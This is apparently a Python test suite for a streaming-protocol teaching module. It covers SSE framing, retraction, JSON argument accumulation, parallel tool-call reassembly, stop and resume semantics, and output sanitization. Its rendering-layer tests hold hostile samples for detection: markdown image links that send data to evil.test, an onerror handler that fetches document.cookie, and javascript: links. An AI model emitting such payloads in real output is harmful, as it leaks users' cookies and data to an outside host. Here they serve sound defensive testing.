"""验证 l16/wire.py。跑法：uv run python -m l16.verify

先跑 `WIRE_IMPL=shared uv run python -m l16.verify` 确认测试本身是对的。

★ 一次模型都不调。这一节比别的更该如此——它要测的东西**全部**是协议和状态机，
而且有好几个分支在真实调用里几乎撞不到：

    服务端中途换模型（零 delta 的空块）      罕见，你没法让它发生
    max_tokens 恰好切在参数中间              要反复试，每次切的位置还不同
    CDN 把 SSE 帧重新分块                    本地根本没有 CDN
    流跑到一半失败并重试                     要制造上游故障

换句话说：**真去调模型的话，这里最重要的那几条断言一条都跑不到。**
这和 L15「实测延迟不可复现」是同一个理由的另一面。

断言编号照搬调研报告第十节的六组清单，一共 68 条，展开成 136 项：
    A 分帧（22）· B 撤回（12）· C 参数累积（11）
    D 并行归位（8）· E 中断语义（8）· F 渲染层（7）

★ 和 TS 侧的差异只有两处，而且都是语言本身造成的，不是实现差异：
    · E-05 那一组：Python 没有 AbortSignal，用 abort_cause(reason, aborted) 测同一个语义
    · F-01..F-03：断言的是 l16/ui/App.tsx 的源码（那个界面只有 TS 版），两边读同一个文件
"""

from __future__ import annotations

import json
import os
import re
import sys
import time
from pathlib import Path
from typing import Any, Literal

from shared import wire as shared
from shared.wire import Chunk, HistoryBlock, Message, RawToolEvent, SseEvent, View

TARGET = "shared" if os.environ.get("WIRE_IMPL") == "shared" else "mine"


class _Mine:
    """★ l16/wire.py 里的 TODO 用的是 My*/my_* 前缀，这里把名字映射回去。

    没有 TODO 版本的一律用参考实现——它们不是这一节的练习目标。
    """

    def __init__(self) -> None:
        from l16 import wire as m

        self.SseParser = m.MySseParser
        self.find_frame_end = m.my_find_frame_end
        self.apply_chunk = m.my_apply_chunk
        self.JsonAccumulator = m.MyJsonAccumulator
        self.reassemble = m.my_reassemble
        self.check_resumable = m.my_check_resumable
        self.audit_links = m.my_audit_links
        # 以下没有 TODO 版本
        self.Utf8Stream = shared.Utf8Stream
        self.Relay = shared.Relay
        self.relay_frames = shared.relay_frames
        self.chop_relay = shared.chop_relay
        self.empty_view = shared.empty_view
        self.visible_text = shared.visible_text
        self.invalid_json_payload = shared.invalid_json_payload
        self.sanitize_inline = shared.sanitize_inline
        self.StopPolicy = shared.StopPolicy
        self.abort_cause = shared.abort_cause
        self.build_resume_request = shared.build_resume_request


M: Any = shared if TARGET == "shared" else _Mine()

print(
    "\n（测的是 shared/ 里的参考实现）"
    if TARGET == "shared"
    else "\n（测的是 l16/ 里你的实现）"
)

DIM, BOLD, RED, GREEN, OFF = "\x1b[2m", "\x1b[1m", "\x1b[31m", "\x1b[32m", "\x1b[0m"

passed = 0
failures: list[str] = []


def _show(v: object) -> str:
    if isinstance(v, str):
        return json.dumps(v, ensure_ascii=False)
    try:
        return json.dumps(v, ensure_ascii=False, default=lambda o: o.__dict__)
    except (TypeError, ValueError):
        return repr(v)


def eq(a: object, b: object, msg: str = "") -> None:
    global passed
    if a == b:
        passed += 1
    else:
        failures.append(msg)
        print(f"  {RED}✕{OFF} {msg}")
        print(f"{DIM}      期望 {_show(b)}{OFF}")
        print(f"{DIM}      实际 {_show(a)}{OFF}")


def ok(c: bool, msg: str = "") -> None:
    global passed
    if c:
        passed += 1
    else:
        failures.append(msg)
        print(f"  {RED}✕{OFF} {msg}")


def throws(fn: Any, msg: str = "") -> None:
    global passed
    try:
        fn()
    except Exception:  # noqa: BLE001 — 这里就是要抓住任何异常
        passed += 1
        return
    failures.append(f"{msg}（应该抛异常但没有）")
    print(f"  {RED}✕{OFF} {msg}（应该抛异常但没有）")


def no_throw(fn: Any, msg: str = "") -> None:
    global passed
    try:
        fn()
        passed += 1
    except Exception as e:  # noqa: BLE001
        failures.append(f"{msg}（抛了：{e}）")
        print(f"  {RED}✕{OFF} {msg}（抛了：{e}）")


def section(s: str) -> None:
    print(f"{BOLD}\n{s}{OFF}")


# ── 小工具 ───────────────────────────────────────────────────


def parse(*chunks: str) -> list[SseEvent]:
    p = M.SseParser()
    out: list[SseEvent] = []
    for c in chunks:
        out.extend(p.feed(c))
    p.end()
    return out


def as_tuples(evs: list[SseEvent]) -> list[tuple[str, str, str]]:
    """★ 转成元组比较，避免依赖 dataclass 的 __eq__ 和字段顺序。

    TS 侧用 JSON.stringify 比较，字段顺序会影响结果；Python 侧用元组，
    顺序是显式写在这里的。两边测的是同一件事，手法不同是语言决定的。
    """
    return [(e.type, e.data, e.last_event_id) for e in evs]


def every_cut(src: str, label: str) -> None:
    """把一个字符串在每个字节位置切成两块，逐一验证结果不变。"""
    global passed
    want = as_tuples(parse(src))
    for i in range(1, len(src)):
        if as_tuples(parse(src[:i], src[i:])) != want:
            ok(False, f"{label}：在第 {i} 字节切开后结果变了")
            return
    passed += 1


def apply(*cs: Chunk) -> View:
    v = M.empty_view()
    for c in cs:
        v = M.apply_chunk(v, c)
    return v


# ═════════════════════════════════════════════════════════════
section("A · 分帧（22 条）")
# ═════════════════════════════════════════════════════════════

# A-01 规范示例
eq(as_tuples(parse("data: a\n\n")), [("message", "a", "")], "A-01 最简事件")

# A-02 / A-03 三种行结束符
eq(as_tuples(parse("data: a\r\n\r\n")), [("message", "a", "")], "A-02 CRLF")
eq(as_tuples(parse("data: a\r\r")), [("message", "a", "")], "A-03 纯 CR")

# A-04 ★ 同一条流里混用
eq(
    as_tuples(parse("data: a\r\ndata: b\n\n")),
    [("message", "a\nb", "")],
    "A-04 ★ 混用行结束符",
)

# A-05 ★ 末尾不完整的事件直接丢弃
eq(as_tuples(parse("data: a\n")), [], "A-05 ★ 无空行结尾的事件不派发")

# A-06 / A-07 冒号后只忽略一个空格
eq(parse("data:a\n\n")[0].data, "a", "A-06 无空格")
eq(parse("data:  a\n\n")[0].data, " a", "A-07 ★ 两个空格只吃掉一个")

# A-08 多 data 行用 \n 连接、去掉末尾那个
eq(parse("data: a\ndata: b\ndata: c\n\n")[0].data, "a\nb\nc", "A-08 多 data 行")

# A-09 没有冒号的整行是字段名，值为空串
eq(as_tuples(parse("data\n\n")), [("message", "", "")], "A-09 无冒号行")

# A-10 注释被忽略，而且是**安静地**忽略
eq(len(parse(": comment\ndata: a\n\n")), 1, "A-10 注释行忽略")
eq(len(parse(":\n:\n:\n")), 0, "A-10b ★ 纯保活心跳不产生任何事件")

# A-11 event 字段
eq(parse("event: foo\ndata: a\n\n")[0].type, "foo", "A-11 event 字段")
eq(parse("data: a\n\n")[0].type, "message", 'A-11b ★ 默认类型是 "message" 不是空串')

# A-12 ★ 空的 id: 是重置，不是忽略
eq(
    [e.last_event_id for e in parse("id: 1\ndata: a\n\nid:\ndata: b\n\n")],
    ["1", ""],
    "A-12 ★ 空 id 重置 last event ID",
)

# A-13 last event ID 有粘性
eq(
    [e.last_event_id for e in parse("id: 1\ndata: a\n\ndata: b\n\n")],
    ["1", "1"],
    "A-13 last event ID 粘性",
)

# A-14 含 NULL 的 id 整个字段忽略
eq(parse("id: a\u0000b\ndata: x\n\n")[0].last_event_id, "", "A-14 id 含 NULL 则忽略")

# A-15 / A-16 / A-17 retry 只接受纯 ASCII 数字
p1 = M.SseParser()
p1.feed("retry: 3000\ndata: a\n\n")
eq(p1.reconnection_time_ms, 3000, "A-15 retry 合法")

p2 = M.SseParser()
p2.feed("retry: 3000ms\ndata: a\n\n")
eq(p2.reconnection_time_ms, None, "A-16 ★ retry: 3000ms 静默失效，不报错")

p3 = M.SseParser()
p3.feed("retry: -1\n\nretry: 3.5\n\n")
eq(p3.reconnection_time_ms, None, "A-17 ★ 负数和小数都不是 ASCII 数字")

# ★ Python 的 \d 默认匹配 Unicode 数字，所以这一条在这边尤其容易写错
p4 = M.SseParser()
p4.feed("retry: ٣٠٠٠\ndata: a\n\n")  # 阿拉伯-印度数字
eq(p4.reconnection_time_ms, None, "A-17b ★ 非 ASCII 数字也不算（Python 的 \\d 会匹配它）")

# A-18 未知字段忽略。这是前向兼容机制。
eq(len(parse("foo: bar\ndata: a\n\n")), 1, "A-18 未知字段忽略")

# A-19 ★★ 这一组里最有教学价值的一条：切割点无关性
section(f"{DIM}  A-19 ★★ 穷举所有切割点（这一条能抓住 A-01..A-18 的所有漏洞）{OFF}")
for label, src in [
    ("基本", "data: a\n\n"),
    ("CRLF", "data: a\r\n\r\n"),
    ("混用", "data: a\r\ndata: b\n\n"),
    ("带 id/retry", "id: 7\nretry: 100\nevent: x\ndata: a\ndata: b\n\n"),
    ("注释+多事件", ": hi\ndata: 1\n\n: hi\ndata: 2\n\n"),
    ("CR 结尾", "data: a\rdata: b\r\r"),
]:
    every_cut(src, f"A-19 {label}")

# A-20 空 data 不抛异常（Anthropic SDK 真实修过的 bug）
no_throw(lambda: parse("event: ping\ndata:\n\n"), "A-20 ★ 空 data 不抛异常")
eq(parse("event: ping\ndata:\n\n")[0].data, "", "A-20b 空 data 的值是空串")

# A-21 UTF-8 多字节被切在中间
text = "中文测试emoji🎉结束"
raw = text.encode("utf-8")
worst = ""
for cut in range(1, len(raw)):
    st = M.Utf8Stream()
    got = st.push(raw[:cut]) + st.push(raw[cut:]) + st.end()
    if got != text:
        worst = f"第 {cut} 字节切开后得到 {_show(got)}"
ok(worst == "", f"A-21 ★ UTF-8 多字节跨块重组（{worst}）")
# ★ 对照：不做增量解码会怎样
naive = raw[:2].decode("utf-8", "replace") + raw[2:].decode("utf-8", "replace")
ok(naive != text, "A-21b ★ 对照组：每块各自 decode 会产生替换字符")

# A-22 无二次方复杂度
N = 20000
big = "".join(f"data: {i}\n\n" for i in range(N))
t0 = time.perf_counter()
got_big = parse(big)
ms = (time.perf_counter() - t0) * 1000
eq(len(got_big), N, "A-22 两万个事件全部解析出来")
# ★ 二次方实现在这个规模上要几十秒。给一个宽松的上限，只抓数量级。
ok(ms < 8000, f"A-22b ★ 无二次方复杂度（实际 {ms:.0f}ms，上限 8000ms）")

# ── 帧边界（八种空行）────────────────────────────────────────
section(f"{DIM}  帧边界：八种「空行」字节组合{OFF}")
for name, sep in [
    ("CRLF+CRLF", "\r\n\r\n"),
    ("CRLF+LF", "\r\n\n"),
    ("CRLF+CR", "\r\n\r"),
    ("LF+CRLF", "\n\r\n"),
    ("LF+LF", "\n\n"),
    ("LF+CR", "\n\r"),
    ("CR+CRLF", "\r\r\n"),
    ("CR+CR", "\r\r"),
]:
    s = f"data: a{sep}data: b{sep}"
    eq(M.find_frame_end(s), len(f"data: a{sep}"), f"find_frame_end {name}")

# ★ CR 后面跟 LF 不算两个结束符，它就是一个 CRLF
eq(M.find_frame_end("data: a\r\ndata: b\r\n"), None, "★ \\r\\n 是一个结束符不是两个")
eq(M.find_frame_end("data: a\n"), None, "不完整的帧返回 None")

# ★ 转发 + naive 下游：块边界和帧边界无关
relay_src = 'data: {"a":1}\n\ndata: {"b":2}\n\ndata: {"c":3}\n\n'
relay_chunks = [relay_src[i : i + 7] for i in range(0, len(relay_src), 7)]
by_frame = M.chop_relay(relay_chunks, True)
passthru = M.chop_relay(relay_chunks, False)
ok(by_frame.naive_ok, "★ 按帧转发：naive 下游能活")
ok(not passthru.naive_ok, "★ 原样转发：naive 下游解析不全或崩掉")
ok(passthru.naive_crashes > 0, f"★ 原样转发确实让下游崩了 {passthru.naive_crashes} 次")
ok(by_frame.bytewise, "★ 按帧转发不改字节，只改切点")

# ═════════════════════════════════════════════════════════════
section("B · 撤回与状态机（12 条）")
# ═════════════════════════════════════════════════════════════

# B-01 基本累积
v = apply(
    Chunk(type="start-step"),
    Chunk(type="text-delta", id="a", delta="a"),
    Chunk(type="text-delta", id="a", delta="b"),
    Chunk(type="finish-step"),
)
eq(len(v.parts), 1, "B-01 同一个 id 合成一个 part")
eq(M.visible_text(v), "ab", 'B-01b 内容是 "ab"')

# B-02 reset-step 清掉当前 step
eq(
    len(
        apply(
            Chunk(type="start-step"),
            Chunk(type="text-delta", id="a", delta="a"),
            Chunk(type="reset-step"),
        ).parts
    ),
    0,
    "B-02 reset-step 清空当前 step",
)

# B-03 ★ 不能连更早的 step 一起删
eq(
    M.visible_text(
        apply(
            Chunk(type="start-step"),
            Chunk(type="text-delta", id="a", delta="a"),
            Chunk(type="finish-step"),
            Chunk(type="start-step"),
            Chunk(type="text-delta", id="b", delta="b"),
            Chunk(type="reset-step"),
        )
    ),
    "a",
    "B-03 ★ 只删当前 step，保留已成功的第一步",
)

# B-04 ★★ 没有 step 边界时清掉整条消息
eq(
    len(apply(Chunk(type="text-delta", id="a", delta="a"), Chunk(type="reset-step")).parts),
    0,
    "B-04 ★★ 无 step 边界时 reset 清空全部（最容易写漏的一条）",
)

# B-05 工具槽位也要被移除
eq(
    len(
        apply(
            Chunk(type="start-step"),
            Chunk(type="tool-input-start", id="x", tool_name="read"),
            Chunk(type="tool-input-delta", id="x", delta="{"),
            Chunk(type="reset-step"),
        ).parts
    ),
    0,
    "B-05 reset 也移除工具槽位",
)

# B-06 撤回后还能继续写
v = apply(
    Chunk(type="start-step"),
    Chunk(type="text-delta", id="a", delta="a"),
    Chunk(type="reset-step"),
    Chunk(type="text-delta", id="b", delta="b"),
    Chunk(type="finish-step"),
)
eq(M.visible_text(v), "b", "B-06 撤回后可继续写入")
eq(v.retracted, 1, "B-06b 撤回计数为 1")

# B-07 abort 保留已渲染内容
v = apply(
    Chunk(type="start-step"),
    Chunk(type="text-delta", id="a", delta="a"),
    Chunk(type="abort", reason="用户点了停止"),
)
eq(M.visible_text(v), "a", "B-07 abort 保留已渲染的部分")
eq(v.status, "aborted", "B-07b 状态是 aborted")

# B-08 ★★ abort 是终态
eq(
    M.visible_text(
        apply(
            Chunk(type="text-delta", id="a", delta="a"),
            Chunk(type="abort", reason="stop"),
            Chunk(type="text-delta", id="a", delta="b"),
        )
    ),
    "a",
    "B-08 ★★ abort 之后到达的 delta 被丢弃（否则会在用户按下停止后还往屏幕上写字）",
)
eq(
    M.visible_text(
        apply(
            Chunk(type="error", message="boom"),
            Chunk(type="text-delta", id="a", delta="x"),
        )
    ),
    "",
    "B-08b error 也是终态",
)

# B-09 幂等
no_throw(
    lambda: apply(Chunk(type="start-step"), Chunk(type="reset-step"), Chunk(type="reset-step")),
    "B-09 连续两次 reset-step 幂等",
)

# B-10 ★★ 未知类型不抛错
no_throw(lambda: apply(Chunk(type="future-thing")), "B-10 ★★ 未知 chunk 类型不抛异常")
eq(
    M.visible_text(
        apply(
            Chunk(type="text-delta", id="a", delta="a"),
            Chunk(type="future-thing"),
            Chunk(type="text-delta", id="a", delta="b"),
        )
    ),
    "ab",
    "B-10b ★ 未知类型不打断后续处理",
)

# B-11 带未知额外字段（OpenAI 的 obfuscation 真事）
eq(
    M.visible_text(
        apply(Chunk(type="text-delta", id="a", delta="a", extra={"obfuscation": "xY7q"}))
    ),
    "a",
    "B-11 ★ 带未知额外字段正常处理（OpenAI 加 obfuscation 挂过一批客户端）",
)

# B-12 新 id 建新 part
eq(
    len(
        apply(
            Chunk(type="text-delta", id="a", delta="a"),
            Chunk(type="text-delta", id="b", delta="b"),
        ).parts
    ),
    2,
    "B-12 未见过的 id 创建新 part",
)

# ★ finish-step 不结束整条消息
eq(
    apply(Chunk(type="start-step"), Chunk(type="finish-step")).status,
    "streaming",
    "★ finish-step 结束的是一个 step，不改 status",
)

# ═════════════════════════════════════════════════════════════
section("C · 流式参数累积（11 条）")
# ═════════════════════════════════════════════════════════════

# C-01 / C-02 / C-03 三步契约 + 展示与执行的边界
acc = M.JsonAccumulator()
acc.push('{"a":')
mid = acc.get()
eq(mid.state, "streaming", "C-02 未到 stop 时状态是 streaming")
eq(mid.can_execute, False, "C-02b ★★ 未到 stop 不可执行")
eq(mid.snapshot, '{"a":', "C-08 ★ snapshot 可以展示（官方 SDK 就这么给）")
acc.push("1}")
acc.close()
fin = acc.get()
eq(fin.value, {"a": 1}, "C-01 三步累积得到对象")
eq(fin.state, "ready", "C-03 stop 之后状态是 ready")
eq(fin.can_execute, True, "C-03b stop 之后可执行")

# C-04 / C-05 收完也可能非法
acc = M.JsonAccumulator()
acc.push('{"a":')
no_throw(acc.close, "C-04 ★ 收完但非法：不抛异常")
r = acc.get()
eq(r.state, "invalid", "C-04b 状态是 invalid")
eq(r.can_execute, False, "C-04c 不可执行")

# ★★ C-05：用 JSON 库构造包装，不要拼字符串
payload = M.invalid_json_payload('{"a":"he said \\"hi\\""')
no_throw(
    lambda: json.loads(payload),
    "C-05 ★★ INVALID_JSON 包装本身必须是合法 JSON",
)
eq(
    json.loads(payload)["INVALID_JSON"],
    '{"a":"he said \\"hi\\""',
    "C-05b 原始字符串逐字节保留（含引号）",
)

# C-06 ★★ max_tokens 截断
acc = M.JsonAccumulator()
acc.push('{"path":"src/a.ts","replace":"PORT=80')
acc.truncate()
r = acc.get()
eq(r.state, "truncated", "C-06 ★★ 被 max_tokens 切断的状态是 truncated 而不是 invalid")
eq(r.can_execute, False, "C-06b 不可执行")

v = apply(
    Chunk(type="start-step"),
    Chunk(type="text-delta", id="t", delta="我来改端口。"),
    Chunk(type="tool-input-start", id="x", tool_name="edit"),
    Chunk(type="tool-input-delta", id="x", delta='{"path":'),
    Chunk(type="stop-reason", reason="max_tokens"),
)
eq(v.retracted, 1, "C-06c ★★ max_tokens 触发撤回（这条路上没有任何错误信号）")
eq(M.visible_text(v), "我来改端口。", "C-06d 已完成的正文保留")
eq(v.status, "done", "C-06e 流是正常结束的——HTTP 200，没有 error 事件")

# C-07 start 里的 input 是占位符，不是初始值
acc = M.JsonAccumulator()
r = acc.get()
eq(r.snapshot, "", 'C-07 ★ 初始 snapshot 是空串，不是 "{}"')
eq(r.can_execute, False, "C-07b 什么都没收到时不可执行")

# C-09 ★ delta 在任意点被切碎，结果不变
full = '{"path":"src/config.ts","line":42,"text":"中文和 emoji 🎉"}'
want_obj = json.loads(full)
bad = ""
for cut in range(1, len(full)):
    a2 = M.JsonAccumulator()
    a2.push(full[:cut])
    a2.push(full[cut:])
    a2.close()
    if a2.get().value != want_obj:
        bad = f"切在第 {cut} 处"
ok(bad == "", f"C-09 ★ 分帧无关性（{bad}）")

# C-10 ★★ 零 delta 是合法的
acc = M.JsonAccumulator()
no_throw(acc.close, "C-10 ★★ 零 delta 不抛异常")
eq(acc.get().value, {}, "C-10b 零 delta 的结果是 {}（不是解析错误）")
eq(acc.get().state, "ready", "C-10c 零 delta 的状态是 ready")

# C-11 多字节字符被切断
full = '{"t":"中文测试🎉结束"}'
raw = full.encode("utf-8")
# ★ 8 这个位置是刻意选的：`{"t":"` 占 6 字节，`中` 占 3 字节（第 6–8 字节），
# 所以在第 8 字节切开正好落在**字符中间**。切在 9 就是字符边界，等于没测到东西。
st = M.Utf8Stream()
acc = M.JsonAccumulator()
acc.push(st.push(raw[:8]))
acc.push(st.push(raw[8:]))
acc.push(st.end())
acc.close()
eq(acc.get().value, {"t": "中文测试🎉结束"}, "C-11 ★ 多字节字符跨块重组")

# ═════════════════════════════════════════════════════════════
section("D · 并行工具调用的归位（8 条）")
# ═════════════════════════════════════════════════════════════


def ev(
    seq: int,
    item_id: str,
    output_index: int,
    phase: Literal["start", "delta", "stop"],
    tool_name: str = "",
    delta: str = "",
) -> RawToolEvent:
    return RawToolEvent(
        seq=seq,
        item_id=item_id,
        output_index=output_index,
        phase=phase,
        tool_name=tool_name,
        delta=delta,
    )


# D-01 ★★ 本节最重要的单条测试：完全交错
r = M.reassemble(
    [
        ev(1, "a", 0, "start", tool_name="read"),
        ev(2, "b", 1, "start", tool_name="write"),
        ev(3, "a", 0, "delta", delta='{"path":"'),
        ev(4, "b", 1, "delta", delta='{"path":"'),
        ev(5, "a", 0, "delta", delta='A.ts"}'),
        ev(6, "b", 1, "delta", delta='B.ts"}'),
        ev(7, "a", 0, "stop"),
        ev(8, "b", 1, "stop"),
    ]
)
eq(len(r.calls), 2, "D-01 两个工具调用")
eq(r.calls[0].args.value, {"path": "A.ts"}, "D-01b ★★ 交错的参数没有串台（A）")
eq(r.calls[1].args.value, {"path": "B.ts"}, "D-01c ★★ 交错的参数没有串台（B）")

# D-02 三个，随机交错
names = ["read", "write", "grep"]
ids = ["a", "b", "c"]
pieces = [['{"n":', f"{i}}}"] for i in range(3)]
events: list[RawToolEvent] = []
seq = 1
for i, tid in enumerate(ids):
    events.append(ev(seq, tid, i, "start", tool_name=names[i]))
    seq += 1
for k in range(2):
    for i, tid in enumerate(ids):
        events.append(ev(seq, tid, i, "delta", delta=pieces[i][k]))
        seq += 1
for i, tid in enumerate(ids):
    events.append(ev(seq, tid, i, "stop"))
    seq += 1
eq(
    [c.args.value for c in M.reassemble(events).calls],
    [{"n": 0}, {"n": 1}, {"n": 2}],
    "D-02 三路交错全部正确",
)

# D-03 ★ seq 乱序到达
e1 = ev(1, "a", 0, "start", tool_name="read")
e2 = ev(2, "a", 0, "delta", delta='{"p":"')
e3 = ev(3, "a", 0, "delta", delta='x"}')
e4 = ev(4, "a", 0, "stop")
eq(
    M.reassemble([e2, e1, e4, e3]).calls[0].args.value,
    {"p": "x"},
    "D-03 ★ 按 seq 重排后正确（乱序到达是真实存在的）",
)

# D-04 ★ 单调用走同一条代码路径
r = M.reassemble(
    [
        ev(1, "a", 0, "start", tool_name="read"),
        ev(2, "a", 0, "delta", delta='{"p":1}'),
        ev(3, "a", 0, "stop"),
    ]
)
eq(len(r.calls), 1, 'D-04 ★ 单个调用（这条存在的意义是防止写出"单调用特例分支"）')
eq(r.calls[0].args.value, {"p": 1}, "D-04b 单调用参数正确")

# D-05 独立状态机
r = M.reassemble(
    [
        ev(1, "a", 0, "start", tool_name="read"),
        ev(2, "b", 1, "start", tool_name="write"),
        ev(3, "a", 0, "delta", delta='{"p":1}'),
        ev(4, "a", 0, "stop"),
        ev(5, "b", 1, "delta", delta='{"p":'),
    ]
)
eq(r.calls[0].args.state, "ready", "D-05 先 stop 的进入 ready")
eq(r.calls[1].args.state, "streaming", "D-05b 还在流的仍是 streaming")

# D-06 ★★ 零 delta 是模型边界，不是工具调用
r = M.reassemble(
    [
        ev(1, "a", 0, "start", tool_name="read"),
        ev(2, "a", 0, "delta", delta='{"p":1}'),
        ev(3, "a", 0, "stop"),
        ev(4, "fb", 1, "start"),
        ev(5, "fb", 1, "stop"),
        ev(6, "b", 2, "start", tool_name="write"),
        ev(7, "b", 2, "delta", delta='{"p":2}'),
        ev(8, "b", 2, "stop"),
    ]
)
eq(len(r.calls), 2, "D-06 ★★ 零 delta 的块不算工具调用")
eq(r.model_boundaries, [1], "D-06b ★★ 它被识别为模型边界")
eq([c.tool_name for c in r.calls], ["read", "write"], "D-06c 两个真工具调用的名字都对")

# D-07 排序和到达顺序无关
r = M.reassemble(
    [
        ev(1, "b", 5, "start", tool_name="later"),
        ev(2, "b", 5, "delta", delta="{}"),
        ev(3, "b", 5, "stop"),
        ev(4, "a", 2, "start", tool_name="earlier"),
        ev(5, "a", 2, "delta", delta="{}"),
        ev(6, "a", 2, "stop"),
    ]
)
eq(
    [c.tool_name for c in r.calls],
    ["earlier", "later"],
    "D-07 ★ 输出按 output_index 排序，和到达顺序无关",
)

# D-08 协议违规要抛，不要静默兜住
throws(
    lambda: M.reassemble(
        [
            ev(1, "a", 0, "start", tool_name="read"),
            ev(2, "a", 0, "start", tool_name="read"),
        ]
    ),
    "D-08 同一个 item_id 两次 start 抛错",
)
throws(
    lambda: M.reassemble([ev(1, "a", 0, "delta", delta="{}")]),
    "D-08b ★ delta 找不到 start 抛错（不要静默新建）",
)

# ═════════════════════════════════════════════════════════════
section("E · 中断的语义（8 条）")
# ═════════════════════════════════════════════════════════════

# E-01 / E-02 ★★ 这两条是「断言你什么都没做」
sp = M.StopPolicy()
sp.on_unmount()
eq(sp.calls, 0, "E-01 ★★ 组件卸载**不**调停止端点（官方：不要在路由清理里调）")
sp.on_page_hide()
eq(sp.calls, 0, "E-02 ★★ 页面 unload **不**调停止端点（那条流要保持可恢复）")

# E-03 / E-04 用户显式停止，且幂等
sp = M.StopPolicy()
sp.on_user_stop()
eq(sp.calls, 1, "E-03 用户点停止调用恰好一次")
sp.on_user_stop()
sp.on_user_stop()
eq(sp.calls, 1, "E-04 ★ 连点三次仍然只发一次")

# E-05 ★ 合流之后能区分是谁触发的
#
# ★ Python 没有 AbortSignal。但问题是同一个：asyncio.timeout 和用户取消都表现为
# CancelledError，而区分它们有实际后果——**超时该重试，用户取消不该重试**。
# 一个只看「被取消了」的实现会在用户点停止之后自动重试一次。
eq(M.abort_cause(TimeoutError(), True), "timeout", "E-05 ★ 超时触发时能认出来（超时该重试）")
eq(
    M.abort_cause("user pressed stop", True),
    "user",
    "E-05b ★ 用户取消能认出来（这个不该重试）",
)
eq(M.abort_cause(None, False), None, "E-05c 没取消时返回 None")

# E-06 / E-07 / E-08 ★★ 构造下一轮请求
history = [
    HistoryBlock(type="thinking", text="先看配置。", signature="sig-abc-123"),
    HistoryBlock(type="redacted_thinking", text="\u0000redacted-blob"),
    HistoryBlock(type="text", text="端口写在第 42 行。"),
]
partial = apply(
    Chunk(type="text-delta", id="t", delta="我看了一下 config.ts，"),
    Chunk(type="abort", reason="用户点了停止"),
)
req = M.build_resume_request(
    [
        Message(role="user", content=[HistoryBlock(type="text", text="看一下端口配置")]),
        Message(role="assistant", content=history),
    ],
    partial,
)

# E-06 ★★ 末尾不能是 assistant（prefill 会 400）
eq(
    req.messages[-1].role,
    "user",
    "E-06 ★★ 末尾是 user 消息，不是 assistant 续写（prefill 在 4.6+ 直接 400）",
)

# E-07 ★★ thinking 块逐字节原样，含 signature 和 redacted_thinking
asst = next(m for m in req.messages if m.role == "assistant")
eq(asst.content, history, "E-07 ★★ 历史块逐字节原样（含 signature）")
eq(
    len([b for b in asst.content if b.type in ("thinking", "redacted_thinking")]),
    2,
    "E-07b ★★ thinking 和 redacted_thinking 都还在（400 最常见的起因就是把它们滤掉）",
)
ok(
    asst.content[0].signature == "sig-abc-123",
    "E-07c signature 一个字都没变（改一个字就是 400）",
)

# E-08 ★ 断言**没有**对历史做客户端压缩
eq(len(asst.content), 3, "E-08 ★ 没有对历史做客户端压缩（那会破坏签名绑定）")
ok(
    "我看了一下 config.ts，" in (req.messages[-1].content[0].text or ""),
    "E-08b 半截输出被带进了 user 消息",
)

# ★ check_resumable 的判定
with_tool = apply(
    Chunk(type="text-delta", id="t", delta="好的。"),
    Chunk(type="tool-input-start", id="x", tool_name="edit"),
    Chunk(type="tool-input-delta", id="x", delta='{"p":'),
    Chunk(type="abort", reason="stop"),
)
eq(M.check_resumable(with_tool).ok, False, "★ 参数没收完的 tool_use 块不能部分恢复")

# ═════════════════════════════════════════════════════════════
section("F · 渲染层（7 条）")
# ═════════════════════════════════════════════════════════════

# F-01 / F-02 / F-03 ★ 这三条是 DOM 属性，Python 里测不了运行时。
# 所以这里对 App.tsx 的**源码**做静态断言——它能抓住回归
# （比如有人把 polite 改成 assertive），而且这是诚实的做法：
# 不假装测了运行时行为。
#
# ★ 那个界面只有 TS 版（React 镜像成 Python 没有意义），所以两边读的是同一个文件。
app_src = (Path(__file__).parent / "ui" / "App.tsx").read_text(encoding="utf-8")
ok('aria-live="polite"' in app_src, "F-03 ★ aria-live 是 polite（assertive 会清空朗读队列）")
ok('aria-live="assertive"' not in app_src, "F-03b ★ 没有用 assertive")
ok("aria-busy={running}" in app_src, "F-01/F-02 ★ aria-busy 跟着流式状态走")
# ★ live region 必须先渲染成空的再改内容，所以那个容器不能条件渲染
ok(
    re.search(r'aria-live="polite"[\s\S]{0,80}aria-busy', app_src) is not None,
    "F-01b live region 容器常驻（条件渲染的 live region 不会被播报）",
)

# F-04 ★★ 外部图片：三种形式都要抓
md = "\n".join(
    [
        "![](https://evil.test/p?d=leak1)",
        "![载入中][ref]",
        "[ref]: https://evil.test/q?d=leak2",
        '<img src="//evil.test/r?d=leak3">',
        "![ok](https://cdn.trusted.test/logo.png)",
    ]
)
a3 = M.audit_links(md, ["cdn.trusted.test"])
eq(len(a3.found), 4, "F-04 ★ 四个外部资源全部被发现")
eq(len(a3.offending), 3, "F-04b ★ 三个不在白名单内")
ok(any("leak2" in u for u in a3.offending), "F-04c ★★ 参考式 markdown 没被漏掉")
ok("//evil.test/r?d=leak3" in a3.offending, "F-04d ★★ 协议相对 URL 算违规")
ok(not any("trusted" in u for u in a3.offending), "F-04e 白名单内的放行")

# ★ 白名单而不是黑名单：解析不出来的算违规
eq(len(M.audit_links("![](ht!tp://???)", []).offending), 1, "F-04f ★ 解析不出来的当违规")
# ★ 站内路径和 data: 不产生外部请求
eq(
    len(M.audit_links("![](/logo.png)\n![](data:image/png;base64,iVBORw0)", []).offending),
    0,
    "F-04g 站内路径和 data: 放行",
)

# F-05 危险 scheme
out = M.sanitize_inline("点[这里](javascript:alert(1))看看")
ok("javascript:" not in out, "F-05 ★ javascript: href 被清掉")
ok("点" in out, "F-05b 文字保留")
ok("script:" not in M.sanitize_inline("[x](VBScript:msgbox(1))"), "F-05c 大小写变体也清")

# F-06 内联 HTML 的事件处理器
out = M.sanitize_inline("<img src=x onerror=\"fetch('//evil.test/'+document.cookie)\">")
ok("onerror" not in out, "F-06 ★ onerror 属性被去掉")
ok("ONLOAD" not in M.sanitize_inline("<div ONLOAD=x>"), "F-06b 大写也去掉")
ok(
    "evil.test" not in M.sanitize_inline('<script>fetch("//evil.test")</script>'),
    "F-06c script 连内容一起去掉",
)

# F-07 ★★ 工具结果走同一条路径
# 一个"文件内容"，里面藏了注入。★ 它不是模型说的话，但同样不可信。
tool_result = "// TODO: fix\n![](https://evil.test/x?d=fromfile)\n<img src=y onerror=go()>"
eq(
    len(M.audit_links(tool_result, []).offending),
    2,
    "F-07 ★★ 工具结果里的外链同样被扫出来（文件内容也来自外部）",
)
ok("onerror" not in M.sanitize_inline(tool_result), "F-07b 工具结果同样走清理")

# ─────────────────────────────────────────────────────────────

print()
if not failures:
